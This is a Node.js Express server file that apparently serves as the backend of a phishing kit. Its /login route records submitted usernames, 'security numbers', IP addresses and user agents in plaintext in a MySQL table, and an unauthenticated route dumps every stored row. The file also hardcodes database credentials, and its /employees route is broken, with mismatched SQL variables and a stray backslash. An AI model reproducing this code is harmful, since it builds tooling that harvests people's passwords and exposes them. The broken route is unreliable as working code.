const express = require('express');
const mysql = require('mysql');  
const bodyparser = require('body-parser');
const axios = require('axios');
var CryptoJS = require("crypto-js");

const port = process.env.PORT || 8787;

const app = express();
app.use(bodyparser.json());

var mysqlConnection = mysql.createConnection({
    host: 'sql4.freemysqlhosting.net',  
    user : 'sql4465442',  
    password : 'ViegkeaZKG',   
    database : 'sql4465442',  
    multipleStatements : true 
})

mysqlConnection.connect((err) => {  
    if(!err) {  
        console.log("Db Connection Succeed");  
    }  
    else{  
        console.log("Db connect Failed \n Error :" + JSON.stringify(err,undefined,2));  
    }  
}); 

app.get('/customers/details', (req, res) => {

    mysqlConnection.query('SELECT * FROM customers',(err,rows,fields)=>{  
        if(!err)   
        res.send(rows);  
        else  
            console.log(err);  
          
    })  
});

app.post('/login',(req,res)=>{  
    username = req.body.username;
    password = req.body.securityNumber;
    ua = req.body.useragent;
    ip = req.body.ip;
    uniqueid = req.body.uniqueid;

    let details = [username, password, ip, ua, uniqueid];
    let query = `INSERT INTO customers(username,password,ip,useragent,uniqueid,status) VALUES (?,?,?,?,?,1)`

    mysqlConnection.query(query,details,(err,rows,fields)=>{  
    if(!err)
    res.send("Insertion Completed");   
    else  
        console.log(err);  
      
})  
}); 

app.post('/employees',(req,res)=>{  
    let emp = req.body;  
    var sql = "SET @user = ?;SET @pass = ?;SET @ip = ?;SET @useragent = ?;SET @uniqueid = ?;SET @status = 1 \ CALL AddorUpdateEmployee(@EmpID,@Name,@Designation,@City,@ContactNo);"  
    mysqlConnection.query(sql,[emp.EmpID,emp.Name,emp.Designation,emp.City,emp.ContactNo],(err,rows,fields)=>{  
    if(!err)   
    res.send("Insertion Completed");  
    else  
        console.log(err);  
})  
}); 

app.listen(port, () => console.log(`Started server at port ` + port));